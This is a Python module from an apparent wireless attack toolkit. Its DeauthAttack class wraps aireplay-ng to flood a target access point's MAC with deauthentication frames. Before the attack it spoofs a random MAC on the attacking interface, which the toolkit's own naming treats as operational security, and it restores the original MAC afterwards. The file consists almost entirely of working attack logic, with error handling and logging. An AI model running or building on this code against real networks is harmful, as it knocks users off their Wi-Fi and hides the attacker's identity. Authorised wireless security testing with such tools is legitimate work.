import subprocess
import logging
from . import config
from .plugins.opsec_utils import MACChanger
from .core.network_utils import interface_exists, is_monitor_mode # Import for interface checks
from .core.event_logger import log_event # For consistency

logger = logging.getLogger(__name__)

class DeauthAttack:
    def __init__(self, iface, target_mac, count=10):
        self.iface = iface
        self.target_mac = target_mac
        self.count = count
        self.process = None

    def run(self):
        # Ensure interface is in monitor mode (caller's responsibility for now)
        cmd = [
            "aireplay-ng",
            "--deauth", str(self.count),
            "-a", self.target_mac,
            self.iface
        ]

        original_mac_address = None
        mac_changer_instance = None
        mac_changed_successfully = False

        if config.MAC_CHANGE_ENABLED:
            # Interface existence is checked by MACChanger methods if called.
            # Monitor mode check before MAC change might be complex if MAC change needs non-monitor first.
            # For now, let MACChanger handle its own interface checks.
            # We'll add explicit checks before the aireplay-ng command.
            logger.info(f"MAC_CHANGE_ENABLED is True for deauth on {self.iface}.")
            mac_changer_instance = MACChanger()
            if mac_changer_instance.is_macchanger_available():
                original_mac_address = mac_changer_instance.get_current_mac(self.iface)
                if original_mac_address:
                    logger.info(f"Original MAC for {self.iface}: {original_mac_address}")
                    new_mac, _ = mac_changer_instance.set_mac_random(self.iface)
                    if new_mac and new_mac != original_mac_address:
                        logger.info(f"Set random MAC for {self.iface} to {new_mac} for deauth attack.")
                        mac_changed_successfully = True
                    elif new_mac: # MAC was already the new_mac or didn't change
                        logger.info(f"MAC for {self.iface} is already {new_mac} or was not changed by random assignment. Proceeding.")
                        mac_changed_successfully = True # Treat as success as it's the desired state or no change occurred
                    else:
                        logger.warning(f"Failed to set random MAC for {self.iface}. Attack will proceed with current/original MAC.")
                else:
                    logger.warning(f"Could not get original MAC for {self.iface}. Skipping MAC change for deauth.")
            else:
                logger.warning("MACChanger utility not fully operational (macchanger command not found). Skipping MAC change for deauth.")
        else:
            logger.info("MAC_CHANGE_ENABLED is False. Skipping MAC change for deauth attack.")

        # --- Interface checks before aireplay-ng ---
        current_mac_for_attack = "default/unchanged"
        if mac_changer_instance and config.MAC_CHANGE_ENABLED and mac_changed_successfully: # If MAC was changed
            current_mac_for_attack = mac_changer_instance.get_current_mac(self.iface) # Get the new MAC
        elif mac_changer_instance and config.MAC_CHANGE_ENABLED and not mac_changed_successfully and original_mac_address : # MAC change failed but we know original
             current_mac_for_attack = original_mac_address
        elif not config.MAC_CHANGE_ENABLED and mac_changer_instance: # MAC change not enabled, get current
             current_mac_for_attack = mac_changer_instance.get_current_mac(self.iface)


        logger.info(f"Proceeding with deauth attack on {self.target_mac} via {self.iface} (MAC: {current_mac_for_attack}) for {self.count} packets. Executing: {' '.join(cmd)}")

        if not interface_exists(self.iface): # Check interface right before attack command
            logger.error(f"Interface {self.iface} does not exist right before deauth command execution.")
            log_event("deauth_attack_failed", {"interface": self.iface, "target_bssid": self.target_mac, "reason": "Interface disappeared before command"})
            # Revert MAC if it was changed
            if config.MAC_CHANGE_ENABLED and mac_changer_instance and original_mac_address and mac_changed_successfully:
                logger.info(f"Attempting to revert MAC for {self.iface} as attack cannot proceed.")
                mac_changer_instance.revert_to_original_mac(self.iface) # log_event is inside revert
            return {"status": "error", "message": f"Interface {self.iface} disappeared before deauth command."}

        if not is_monitor_mode(self.iface): # Check monitor mode right before attack command
            logger.warning(f"Interface {self.iface} is not in monitor mode right before deauth command. Attack may fail.")
            log_event("deauth_attack_warning_monitor_mode", {"interface": self.iface, "target_bssid": self.target_mac, "reason": "Not in monitor mode before command"})
            # Proceeding as per original logic (aireplay-ng will likely fail if not monitor)

        attack_result = None
        # Timeout: base 15s + 0.5s per packet, min 20s, max 120s.
        # Deauths are usually fast, but interface/driver issues can cause hangs.
        calculated_timeout = min(max(15 + int(self.count * 0.5), 20), 120)
        logger.debug(f"Calculated timeout for aireplay-ng: {calculated_timeout}s for {self.count} packets.")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=True,
                                    timeout=calculated_timeout, encoding='utf-8', errors='ignore')

            logger.debug(f"Deauth attack raw stdout: {result.stdout}")
            if result.stderr: # aireplay-ng often uses stderr for status messages, even on success
                logger.debug(f"Deauth attack raw stderr: {result.stderr}")

            # Success is primarily determined by check=True (exit code 0).
            # The actual number of packets sent might need parsing from stdout/stderr if critical.
            # For now, "success" means the command ran without error.
            logger.info(f"Deauth attack command for {self.iface} on {self.target_mac} executed. Check output for confirmation of packets sent.")
            attack_result = {"status": "success",
                             "output": result.stdout,
                             "error_output": result.stderr, # Include stderr even on success as it might have info
                             "sent_count_requested": self.count,
                             "command": cmd}

        except subprocess.CalledProcessError as e:
            logger.error(f"Deauth attack command '{' '.join(e.cmd)}' failed with code {e.returncode}", exc_info=True)
            attack_result = {"status": "error",
                             "message": e.stderr.strip() if e.stderr else "aireplay-ng command failed with non-zero exit code.",
                             "output": e.stdout.strip() if e.stdout else "",
                             "error_output": e.stderr.strip() if e.stderr else "",
                             "command": e.cmd,
                             "return_code": e.returncode}

        except subprocess.TimeoutExpired as e:
            logger.error(f"Deauth attack command '{' '.join(e.cmd)}' timed out after {calculated_timeout}s.", exc_info=True)
            stderr_str = e.stderr.strip() if e.stderr else ""
            stdout_str = e.stdout.strip() if e.stdout else ""
            if stdout_str: logger.error(f"Partial stdout on timeout: {stdout_str}")
            if stderr_str: logger.error(f"Partial stderr on timeout: {stderr_str}")
            attack_result = {"status": "error",
                             "message": "Deauth attack timed out.",
                             "command": e.cmd,
                             "stderr": stderr_str,
                             "stdout": stdout_str}

        except FileNotFoundError:
            logger.error(f"Command 'aireplay-ng' not found. Please ensure aircrack-ng suite is installed.", exc_info=True)
            attack_result = {"status": "error",
                             "message": "'aireplay-ng' not found. Is aircrack-ng installed and in PATH?",
                             "command": cmd}

        except Exception as e: # Catch any other unexpected exceptions
            logger.error(f"An unexpected error occurred during deauth attack with command '{' '.join(cmd)}'", exc_info=True)
            attack_result = {"status": "error",
                             "message": f"An unexpected error occurred: {str(e)}",
                             "command": cmd}
        finally:
            if config.MAC_CHANGE_ENABLED and mac_changer_instance and original_mac_address and mac_changed_successfully:
                logger.info(f"Attempting to revert MAC for {self.iface} from {mac_changer_instance.get_current_mac(self.iface)} to {original_mac_address}.")
                restored_mac, _ = mac_changer_instance.revert_to_original_mac(self.iface)
                if restored_mac and restored_mac == original_mac_address:
                    logger.info(f"Successfully reverted MAC for {self.iface} to {restored_mac}.")
                elif restored_mac:
                    logger.warning(f"Reverted MAC for {self.iface} to {restored_mac}, but expected {original_mac_address}.")
                else:
                    logger.warning(f"Failed to revert MAC for {self.iface} to {original_mac_address}. Current MAC might still be spoofed.")
            elif config.MAC_CHANGE_ENABLED and mac_changer_instance and original_mac_address and not mac_changed_successfully:
                 logger.info(f"MAC was not changed for {self.iface}, no reversion needed.")

        return attack_result

    def shutdown(self):
        # This basic version doesn't have a long-running process to shut down
        # If run was using Popen, self.process.terminate() would be here
        logger.info("DeauthAttack shutdown (no active process to stop for this version).")
        pass
